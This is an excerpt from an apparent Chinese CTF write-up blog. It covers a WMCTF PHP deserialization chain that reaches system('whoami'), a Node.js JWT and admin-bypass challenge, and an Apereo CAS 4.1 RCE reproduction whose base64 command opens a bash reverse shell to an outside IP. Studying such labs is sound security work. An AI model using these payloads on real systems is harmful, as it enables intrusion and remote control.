<span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;adhoc = <span class="keyword">array</span>(<span class="string">"whoami"</span> =&gt; [<span class="string">"expr"</span> =&gt; <span class="string">"test"</span>]);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;db = <span class="keyword">$this</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;props[<span class="string">'quotekey'</span>] = <span class="string">"system"</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">DB</span>\<span class="title">SQL</span>\<span class="title">Mapper</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Agent</span> </span>&#123;</span><br><span class="line">		<span class="keyword">protected</span></span><br><span class="line">		$server,</span><br><span class="line">		$id,</span><br><span class="line">		$socket,</span><br><span class="line">		$flag,</span><br><span class="line">		$verb,</span><br><span class="line">		$uri,</span><br><span class="line">			$headers;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;server-&gt;events = <span class="keyword">array</span>(<span class="string">"disconnect"</span> =&gt; [<span class="keyword">new</span> Mapper(), <span class="string">"find"</span>]);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">WS</span> </span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> $events = [];</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> Agent();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">CLI</span>\<span class="title">WS</span>;</span><br><span class="line"></span><br><span class="line">	print_r(serialize(<span class="keyword">new</span> WS()));</span><br><span class="line">	<span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> WS()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span> &#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Mapper</span> &#123;</span><br><span class="line">		<span class="title">protected</span></span><br><span class="line">		//! <span class="title">PDO</span> <span class="title">wrapper</span></span><br><span class="line">		$<span class="title">db</span>,</span><br><span class="line">		//! <span class="title">Database</span> <span class="title">engine</span></span><br><span class="line">		$<span class="title">engine</span>,</span><br><span class="line">		//! <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">		$<span class="title">source</span>,</span><br><span class="line">		//! <span class="title">SQL</span> <span class="title">table</span> (<span class="title">quoted</span>)</span><br><span class="line">		$<span class="title">table</span>,</span><br><span class="line">		//! <span class="title">Alias</span> <span class="title">for</span> <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">		$<span class="title">as</span>,</span><br><span class="line">		//! <span class="title">Last</span> <span class="title">insert</span> <span class="title">ID</span></span><br><span class="line">		$<span class="title">_id</span>,</span><br><span class="line">		//! <span class="title">Defined</span> <span class="title">fields</span></span><br><span class="line">		$<span class="title">fields</span>,</span><br><span class="line">		//! <span class="title">Adhoc</span> <span class="title">fields</span></span><br><span class="line">		$<span class="title">adhoc</span> = [],</span><br><span class="line">		//! <span class="title">Dynamic</span> <span class="title">properties</span></span><br><span class="line">		$<span class="title">props</span> = [];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;adhoc = <span class="keyword">array</span>(<span class="string">"whoami"</span> =&gt; [<span class="string">"expr"</span> =&gt; <span class="string">"test"</span>]);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;db = <span class="keyword">$this</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;props[<span class="string">'quotekey'</span>] = <span class="string">"system"</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">DB</span>\<span class="title">SQL</span>\<span class="title">Mapper</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Agent</span> </span>&#123;</span><br><span class="line">		<span class="keyword">protected</span></span><br><span class="line">		$server,</span><br><span class="line">		$id,</span><br><span class="line">		$socket,</span><br><span class="line">		$flag,</span><br><span class="line">		$verb,</span><br><span class="line">		$uri,</span><br><span class="line">			$headers;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;server-&gt;events = <span class="keyword">array</span>(<span class="string">"disconnect"</span> =&gt; [<span class="keyword">new</span> Mapper(), <span class="string">"find"</span>]);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">WS</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">CLI</span>\<span class="title">WS</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//print_r(serialize(new WS()));</span></span><br><span class="line">	<span class="keyword">echo</span> urlencode(serialize(<span class="keyword">array</span>(<span class="keyword">new</span> WS(), <span class="keyword">new</span> CLI\Agent())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/08/2020WMCTF-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200814100410530.png" alt="image-20200814100410530"></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>2020天翼杯Web题目复现</title>
    <url>/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>2020天翼杯Web题目复现</p>
<a id="more"></a>

<h1 id="0x01-API"><a href="#0x01-API" class="headerlink" title="0x01 API"></a>0x01 API</h1><p>首先在本地搭建环境，app.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">"express"</span>);</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">"cors"</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="comment">//const uuidv4 = require("uuid/v4"); 本地复现时最新版本的uuid不支持这种写法</span></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="attr">v4</span>: uuidv4 &#125; = <span class="built_in">require</span>(<span class="string">'uuid'</span>);</span><br><span class="line"><span class="keyword">const</span> md5 = <span class="built_in">require</span>(<span class="string">"md5"</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">"express-jwt"</span>);</span><br><span class="line"><span class="keyword">const</span> jsonwebtoken = <span class="built_in">require</span>(<span class="string">"jsonwebtoken"</span>);</span><br><span class="line"><span class="keyword">const</span> server = <span class="built_in">require</span>(<span class="string">"http"</span>).createServer(app);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; flag, secret, jwtSecret &#125; = <span class="built_in">require</span>(<span class="string">"./flag"</span>);</span><br><span class="line"><span class="comment">/*console.log(require("./flag"));</span></span><br><span class="line"><span class="comment">console.log(flag);</span></span><br><span class="line"><span class="comment">console.log(secret);</span></span><br><span class="line"><span class="comment">console.log(jwtSecret);*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  port: process.env.PORT || <span class="number">8081</span>,</span><br><span class="line">  adminValue: <span class="number">1000</span>,</span><br><span class="line">  message: <span class="string">"Can you get flag?"</span>,</span><br><span class="line">  secret: secret,</span><br><span class="line">  adminUsername: <span class="string">"kirakira_dokidoki"</span>,</span><br><span class="line">  whitelist: [<span class="string">"/"</span>, <span class="string">"/login"</span>, <span class="string">"/init"</span>, <span class="string">"/source"</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> users = &#123;</span><br><span class="line">  <span class="number">0</span>: &#123;</span><br><span class="line">    username: config.adminUsername,</span><br><span class="line">    isAdmin: <span class="literal">true</span>,</span><br><span class="line">    rights: <span class="built_in">Object</span>.keys(config)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line"></span><br><span class="line">app.use(cors());</span><br><span class="line"></span><br><span class="line">app.use(</span><br><span class="line">  jwt(&#123; <span class="attr">secret</span>: jwtSecret &#125;).unless(&#123;</span><br><span class="line">    path: config.whitelist</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">error, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (error.name === <span class="string">"UnauthorizedError"</span>) &#123;</span><br><span class="line">    res.json(err(<span class="string">"Invalid token or not logged in."</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sign</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> jsonwebtoken.sign(o, jwtSecret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ok</span>(<span class="params">data = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">status</span>: <span class="string">"ok"</span>, <span class="attr">data</span>: data &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">err</span>(<span class="params">msg = <span class="string">"Something went wrong."</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">status</span>: <span class="string">"error"</span>, <span class="attr">message</span>: msg &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidUser</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    u.username.length &gt;= <span class="number">6</span> &amp;&amp;</span><br><span class="line">    u.username.toUpperCase() !== config.adminUsername.toUpperCase() &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toLowerCase()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (u.username.toUpperCase() === config.adminUsername.toUpperCase() &amp;&amp; u.username.toUpperCase() === config.adminUsername.toLowerCase()) || u.isAdmin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkRights</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> blacklist = [<span class="string">"secret"</span>, <span class="string">"port"</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(blacklist.includes(arr)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = arr[i];</span><br><span class="line">    <span class="keyword">if</span> (blacklist.includes(element)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  res.json(ok(&#123; <span class="attr">hint</span>:  <span class="string">"You can get source code from /source"</span>&#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/source"</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.sendFile( __dirname + <span class="string">"/"</span> + <span class="string">"app.js"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">"/login"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> u = &#123;</span><br><span class="line">    username: req.body.username,</span><br><span class="line">    id: uuidv4(),</span><br><span class="line">    value: <span class="built_in">Math</span>.random() &lt; <span class="number">0.0000001</span> ? <span class="number">100000000</span> : <span class="number">100</span>,</span><br><span class="line">    isAdmin: <span class="literal">false</span>,</span><br><span class="line">    rights: [</span><br><span class="line">      <span class="string">"message"</span>,</span><br><span class="line">      <span class="string">"adminUsername"</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">console</span>.log(u);</span><br><span class="line">  <span class="keyword">if</span> (isValidUser(u)) &#123;</span><br><span class="line">    users[u.id] = u;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">token</span>: sign(&#123; <span class="attr">id</span>: u.id &#125;) &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.json(err(<span class="string">"Invalid creds"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">"/init"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123; secret &#125; = req.body;</span><br><span class="line">  <span class="keyword">let</span> target = md5(config.secret.toString());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> adminId = md5(secret)</span><br><span class="line">    .split(<span class="string">""</span>)</span><br><span class="line">    .map(<span class="function">(<span class="params">c, i</span>) =&gt;</span> c.charCodeAt(<span class="number">0</span>) ^ target.charCodeAt(i))</span><br><span class="line">    .reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b);</span><br><span class="line">  <span class="built_in">console</span>.log(adminId);</span><br><span class="line">  res.json(ok(&#123; <span class="attr">token</span>: sign(&#123; <span class="attr">id</span>: adminId &#125;) &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Get server info</span></span><br><span class="line">app.get(<span class="string">"/serverInfo"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(req.user);</span><br><span class="line">  <span class="keyword">let</span> user = users[req.user.id] || &#123; <span class="attr">rights</span>: [] &#125;;</span><br><span class="line">  <span class="built_in">console</span>.log(user);</span><br><span class="line">  <span class="keyword">let</span> info = user.rights.map(<span class="function"><span class="params">i</span> =&gt;</span> (&#123; <span class="attr">name</span>: i, <span class="attr">value</span>: config[i] &#125;));</span><br><span class="line">  res.json(ok(&#123; <span class="attr">info</span>: info &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">"/becomeAdmin"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123;value&#125; = req.body;</span><br><span class="line">  <span class="keyword">let</span> uid = req.user.id;</span><br><span class="line">  <span class="keyword">let</span> user = users[uid];</span><br><span class="line">  <span class="built_in">console</span>.log(user);</span><br><span class="line">  <span class="keyword">let</span> maxValue = [value, config.adminValue].sort()[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span>(value &gt;= maxValue &amp;&amp; user.value &gt;= value) &#123;</span><br><span class="line">    user.isAdmin = <span class="literal">true</span>;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">isAdmin</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.json(err(<span class="string">"You need pay more!"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// only admin can update user</span></span><br><span class="line">app.post(<span class="string">"/updateUser"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> uid = req.user.id;</span><br><span class="line">  <span class="keyword">let</span> user = users[uid];</span><br><span class="line">  <span class="keyword">if</span> (!user || !isAdmin(user)) &#123;</span><br><span class="line">    res.json(err(<span class="string">"You're not an admin!"</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> rights = req.body.rights || [];</span><br><span class="line">  <span class="keyword">if</span> (rights.length &gt; <span class="number">0</span> &amp;&amp; checkRights(rights)) &#123;</span><br><span class="line">    users[uid].rights = user.rights.concat(rights).filter(<span class="function">(<span class="params">value, index, self</span>)=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> self.indexOf(value) === index;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.json(ok(&#123; <span class="attr">user</span>: users[uid] &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// only uid===0 can get the flag</span></span><br><span class="line">app.get(<span class="string">"/flag"</span>, (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.user.id == <span class="number">0</span>) &#123;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">flag</span>: flag &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.send(err(<span class="string">"Unauthorized"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(config.port, () =&gt;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Server listening on port <span class="subst">$&#123;config.port&#125;</span>!`</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>在app.js目录下新建flag.json，内容如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"flag"</span>: <span class="string">"flag&#123;mount4in&#125;"</span>,</span><br><span class="line">    <span class="attr">"secret"</span>: <span class="string">"1145141919810"</span>,</span><br><span class="line">    <span class="attr">"jwtSecret"</span>: <span class="string">"secret"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>package.json</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"api"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"app.js"</span>,</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"author"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"ISC"</span>,</span><br><span class="line">  <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"cors"</span>: <span class="string">"^2.8.5"</span>,</span><br><span class="line">    <span class="attr">"express"</span>: <span class="string">"^4.17.1"</span>,</span><br><span class="line">    <span class="attr">"express-jwt"</span>: <span class="string">"^5.0.0"</span>,</span><br><span class="line">    <span class="attr">"md5"</span>: <span class="string">"^2.3.0"</span>,</span><br><span class="line">    <span class="attr">"uuid"</span>: <span class="string">"^8.3.0"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析题目，题目是改的<a href="https://xz.aliyun.com/t/7177" target="_blank" rel="noopener">HackTM</a>的一道Node Js，较原题添加了一个关于javascript中sort()函数的trick。</p>
<img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806085223552.png" alt="image-20200806085223552" style="zoom:200%;">

<p>接下来分析题目，题目源码引用了jsonwebtoken和express-jwt两个库，jsonwebtoken用来生成jwt，发送给客户端，express-jwt用来解密客户端发送HTTP请求中携带的Authorization字段，然后将解密后的值赋给<code>req.user</code>。如下图的代码，表示除了<code>/</code>, <code>/login</code>, <code>/init</code>, <code>/source</code>这四个路由以外，访问其他路由时都需要带Authorization字段。</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806085727632.png" alt="image-20200806085727632"></p>
<p>首先看如何才能得到flag，</p>
<img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806085323881.png" alt="image-20200806085323881" style="zoom:200%;">

<p>必须要req.user.id为0才可以得到flag，接下来寻找怎么能让user.id为0，看/init路由</p>
<img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806090112714.png" alt="image-20200806090112714" style="zoom:200%;">

<p>上述代码，首先获取请求的secret值，然后将请求输入的secret和源码中config中的secret分别MD5处理，之后将这两个MD5生成的字符串每位分别进行异或，然后将每一位异或得到的结果取和，将和赋给adminId，利用jsonwebtoken进行加密。我们需要得到id为0对应的token,所以需要使这里的adminId为0，当两个相同的数异或得到的结果为0，所以这里需要我们输入的secret和源码中config.secret相同，接下来需要寻找config.secret的值。普通的用户访问/serverinfo得到的信息只有message和adminUsername，所以需要更新权限获得secret。</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806091148515.png" alt="image-20200806091148515"></p>
<p>在/updateUser路由可以根据输入的rights更新用户的权限，但是需要是admin。</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806091329390.png" alt="image-20200806091329390"></p>
<p>看一下isAdmin()函数</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806091539505.png" alt="image-20200806091539505"></p>
<p>大小写应该是绕不过了，看哪里可以修改u.isAdmin，</p>
<img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806091642147.png" alt="image-20200806091642147" style="zoom:150%;">

<p>在/becomeAdmin路由，因为登录时user.value值有很大的概率为100</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">let u = &#123;</span><br><span class="line">    username: req.body.username,</span><br><span class="line">    id: uuidv4(),</span><br><span class="line">    value: Math.random() &lt; <span class="number">0.0000001</span> ? <span class="number">100000000</span> : <span class="number">100</span>,</span><br><span class="line">    isAdmin: <span class="keyword">false</span>,</span><br><span class="line">    rights: [</span><br><span class="line">      <span class="string">"message"</span>,</span><br><span class="line">      <span class="string">"adminUsername"</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>利用sort()函数排序的问题，输入value为2即可绕过，成为admin,然后看checkRights()函数，</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806091346333.png" alt="image-20200806091346333"></p>
<p>这里遍历数组中的每个元素，如果包含secret就不能添加，采用<code>[[&quot;secret&quot;]]</code>可以绕过。</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093341659.png" alt="image-20200806093341659" style="zoom: 150%;"><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093503900.png" alt="image-20200806093503900"></p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093341659.png" alt="image-20200806093341659" style="zoom: 150%;"><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093503900.png" alt="image-20200806093503900"></p>
<p>之后利用/serverInfo得到secret，在用/init得到id为1的用户token去访问/flag即可。</p>
<p>解题过程</p>
<ol>
<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093725700.png" alt="image-20200806093725700"></li>
<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093800754.png" alt="image-20200806093800754"></li>
<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093822275.png" alt="image-20200806093822275"></li>
<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093913761.png" alt="image-20200806093913761"></li>
<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806093948710.png" alt="image-20200806093948710"></li>
<li><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806094012071.png" alt="image-20200806094012071"></li>
</ol>
<h1 id="0x02-apereocas"><a href="#0x02-apereocas" class="headerlink" title="0x02 apereocas"></a>0x02 <strong>apereocas</strong></h1><p>利用p神的vulhub环境进行复现，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/apereo-cas/4.1-rce/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806203813868.png" alt="image-20200806203813868"></p>
<ul>
<li><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2></li>
</ul>
<p><a href="https://github.com/vulhub/Apereo-CAS-Attack" target="_blank" rel="noopener">Apereo-CAS-Attack</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806204844774.png" alt="image-20200806204844774"></p>
<p>burp发包：</p>
<p>vps：</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200806204957401.png" alt="image-20200806204957401"></p>
<ul>
<li><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2></li>
</ul>
<p><a href="https://github.com/potats0/CasExp" target="_blank" rel="noopener">CasExp</a></p>
<p>下载下来需要自己打包才可以用，记录下自己打包mvn项目时踩的坑。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;potats0&#x2F;CasExp</span><br></pre></td></tr></table></figure>

<p>配置maven</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808111602995.png" alt="image-20200808111602995"></p>
<p>选择Enable Auto-Import</p>
<p><img src="/2020/08/06/2020%E5%A4%A9%E7%BF%BC%E6%9D%AFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808111507624.png" alt="image-20200808111507624"></p>
<p>打包</p>
